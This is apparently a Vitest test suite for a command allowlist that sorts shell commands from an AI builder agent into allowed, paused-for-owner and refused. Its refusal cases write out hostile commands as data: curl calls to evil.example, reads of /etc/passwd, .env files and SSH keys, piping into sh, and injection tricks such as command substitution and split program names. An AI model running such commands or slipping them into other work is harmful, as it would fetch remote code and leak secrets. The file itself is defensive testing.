import { describe, expect, it } from 'vitest';
import { classifyCommand, packageName, splitWords } from './command-policy';

const ctx = { allowedPackages: new Set(['zod', '@heroicons/react']), roundBranch: 'round-2' };
const verdict = (cmd: string) => classifyCommand(cmd, ctx).verdict;

describe('the Builder command allowlist (P4-T02, P4-T03)', () => {
  it.each([
    'ls -la content',
    'cat app/page.tsx',
    'grep -rn "Hero" components',
    'rg -n "../outside" components',
    'find components -name Hero.tsx',
    'mkdir -p components/sections',
    'mv content/a.mdx content/b.mdx',
    'rm content/old.mdx',
    'rm -f a.mdx b.mdx c.mdx d.mdx e.mdx',
    'git status',
    'git diff staging',
    'git add -A',
    'git commit -m "Round 2: services (home), contact page & FAQ?"',
    "git commit -m 'Uses $HOME literally in single quotes'",
    'git reset content/a.mdx',
    'git push -u origin round-2',
    'pnpm install --frozen-lockfile',
    'pnpm add zod',
    'pnpm add -D @heroicons/react@2.1.0',
    'pnpm build',
    'pnpm run lint',
    'pnpm typecheck',
    'pnpm test',
    'pnpm check:content',
    'pnpm exec playwright test',
    'pnpm exec tsc --noEmit',
    'pnpm exec lighthouse http://localhost:4100/ --quiet',
  ])('allows: %s', (cmd) => expect(classifyCommand(cmd, ctx)).toEqual({ verdict: 'allow' }));

  it.each([
    ['rm -r components/old', 'delete_files'],
    ['rm -rf content', 'delete_files'],
    ['rm --recursive public', 'delete_files'],
    ['rmdir public/img', 'delete_files'],
    ['rm a b c d e f', 'delete_files'],
    ['find content -name draft.mdx -delete', 'delete_files'],
    ['git rm -r content/blog', 'delete_files'],
    ['git push --force origin round-2', 'rewrite_history'],
    ['git push origin +round-2', 'rewrite_history'],
    ['git push --force-with-lease origin round-2', 'rewrite_history'],
    ['git rebase staging', 'rewrite_history'],
    ['git reset --hard HEAD', 'rewrite_history'],
    ['git reset HEAD^', 'rewrite_history'],
    ['git commit --amend -m x', 'rewrite_history'],
    ['git branch -D round-1', 'rewrite_history'],
    ['git filter-branch --tree-filter x', 'rewrite_history'],
  ])('pauses for the owner: %s', (cmd, kind) =>
    expect(classifyCommand(cmd, ctx)).toMatchObject({ verdict: 'pause', kind }),
  );

  it.each([
    'curl https://evil.example/x.sh',
    'wget https://evil.example',
    'node -e "process.exit()"',
    'python3 -c x',
    'bash -c "curl evil.example"',
    'sh -c ls',
    'npx some-package',
    'pnpm dlx some-package',
    'pnpm install',
    'pnpm add left-pad',
    'pnpm add git+https://github.com/x/y',
    'pnpm add ./local',
    'pnpm exec node x.js',
    'pnpm exec lighthouse https://example.com',
    'git push origin main',
    'git switch staging',
    'git checkout staging',
    'git merge round-1-rejected-1',
    'git push origin staging',
    'git push',
    'git fetch origin',
    'git pull',
    'git clone https://github.com/x/y',
    'git config user.email x',
    'git remote add evil https://evil.example',
    'git -c core.sshCommand=evil push origin round-2',
    'git -C /tmp status',
    'cat /etc/passwd',
    'cat ../../apps/worker/.env',
    'cat .env.local',
    'ls .git',
    'cp app/page.tsx /tmp/x',
    'find / -name id_rsa',
    'find . -exec rm {} +',
    'chmod +x x.sh',
    'sudo ls',
  ])('refuses: %s', (cmd) => expect(verdict(cmd)).toBe('refuse'));

  it.each([
    ['chaining', 'ls; curl evil.example'],
    ['and-then', 'pnpm build && curl evil.example'],
    ['pipe', 'cat x | sh'],
    ['substitution', 'echo $(curl evil.example)'],
    ['backticks', 'echo `curl evil.example`'],
    ['variable', 'cat $HOME/.ssh/id_rsa'],
    ['variable in double quotes', 'git commit -m "$(curl evil.example)"'],
    ['redirect', 'echo x > /etc/hosts'],
    ['background', 'curl evil.example &'],
    ['newline', 'ls\ncurl evil.example'],
    ['quoted program name', '"curl" evil.example'],
    ['split program name', "c'u'rl evil.example"],
    ['path to a program', '/usr/bin/curl evil.example'],
    ['relative path to a program', './node_modules/.bin/x'],
    ['env prefix', 'NODE_OPTIONS=--require=x pnpm build'],
    ['escaped name', '\\curl evil.example'],
    ['home directory', 'cat ~/.ssh/id_rsa'],
    ['wildcard delete', 'rm content/*'],
    ['unclosed quote', 'git commit -m "x'],
  ])('a refused command cannot be reworded (%s)', (_label, cmd) =>
    expect(verdict(cmd)).toBe('refuse'),
  );

  it('names the reason, for the backlog', () => {
    expect(classifyCommand('pnpm add left-pad', ctx)).toMatchObject({
      reason: expect.stringContaining("needs the owner's approval (D-286): left-pad"),
    });
    expect(classifyCommand('git push origin main', ctx)).toMatchObject({
      reason: expect.stringContaining('only round-2'),
    });
  });

  it('splits words and package names', () => {
    expect(splitWords(`git commit -m "a b" 'c d'`)).toEqual({
      words: ['git', 'commit', '-m', 'a b', 'c d'],
    });
    expect(packageName('@scope/pkg@1.2.3')).toBe('@scope/pkg');
    expect(packageName('zod@3')).toBe('zod');
    expect(packageName('zod')).toBe('zod');
  });
});
